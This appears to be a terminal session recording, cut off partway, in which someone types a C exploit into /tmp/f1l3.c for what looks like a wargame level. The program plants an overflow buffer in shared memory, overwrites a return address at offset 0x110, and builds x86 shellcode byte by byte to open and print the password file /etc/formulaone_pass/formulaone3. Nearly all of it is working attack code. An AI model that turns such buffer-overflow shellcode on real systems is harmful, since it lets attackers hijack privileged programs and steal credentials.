[31.182537, "o", "cat > /tmp/f1l3.c <<'CEOF'\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <stdio.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <stdlib.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <string.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <unistd.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <sys/ipc.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <sys/shm.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <sys/wait.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <signal.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> struct msg { int sz; char ptr[1024]; };\r\r\n\u001b[?2004l\r\u001b[?2004h> int main(int argc, char **argv) {\r\r\n\u001b[?2004l\r\u001b[?2004h>     unsigned int shmkey = strtoul(argv[1], 0, 0);\r\r\n\u001b[?2004l\r\u001b[?2004h>     unsigned int shmaddr = strtoul(argv[2], 0, 0);\r\r\n\u001b[?2004l\r\u001b[?2004h>     int sc_off = 0x200;\r\r\n\u001b[?2004l\r\u001b[?2004h>     int shmid = shmget(shmkey, 8192, IPC_CREAT | 0777);\r\r\n\u001b[?2004l\r\u001b[?2004h>     if (shmid < 0) { perror(\"shmget\"); return 1; }\r\r\n\u001b[?2004l\r\u001b[?2004h>     struct msg *m = shmat(shmid, NULL, 0);\r\r\n\u001b[?2004l\r\u001b[?2004h>     if (m == (void*)-1) { perror(\"shmat\"); return 1; }\r\r\n\u001b[?2004l\r\u001b[?2004h>     memset(m->ptr, 'A', 1024);\r\r\n\u001b[?2004l\r\u001b[?2004h>     *(unsigned int *)(m->ptr + 0x110) = shmaddr + sc_off;\r\r\n\u001b[?2004l\r\u001b[?2004h>     {   /* shellcode: open/read/write /etc/formulaone_pass/formulaone3 -> fd 1 */\r\r\n\u001b[?2004l\r\u001b[?2004h>         char *path = \"/etc/formulaone_pass/formulaone3\";\r\r\n\u001b[?2004l\r\u001b[?2004h>         int len = strlen(path), off = 0;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC0;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x50;\r\r\n\u001b[?2004l\r\u001b[?2004h>         for (int c = len - 4; c >= 0; c -= 4) {\r\r\n\u001b[?2004l\r\u001b[?2004h>             m->ptr[sc_off + off++] = 0x68;\r\r\n\u001b[?2004l\r\u001b[?2004h>             for (int k = 0; k < 4; k++)\r\r\n\u001b[?2004l\r\u001b[?2004h>                 m->ptr[sc_off + off++] =\r\r\n\u001b[?2004l\r\u001b[?2004h>                     (c + k < len) ? path[c + k] : 0;\r\r\n\u001b[?2004l\r\u001b[?2004h>         }\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE3;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xC9;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x05;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xC3;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x83; m->ptr[sc_off + off++] = 0xEC;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x40;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE1;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xD2;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0xB2; m->ptr[sc_off + off++] = 0x21;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0xB0; m->ptr[sc_off + off++] = 0x03;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0xCD; m->ptr[sc_off + off++] = 0x80;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x31; m->ptr[sc_off + off++] = 0xDB;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0xB3; m->ptr[sc_off + off++] = 0x01;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xE1;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x89; m->ptr[sc_off + off++] = 0xC2;\r\r\n\u001b[?2004l\r\u001b[?2004h>         m->ptr[sc_off + off++] = 0x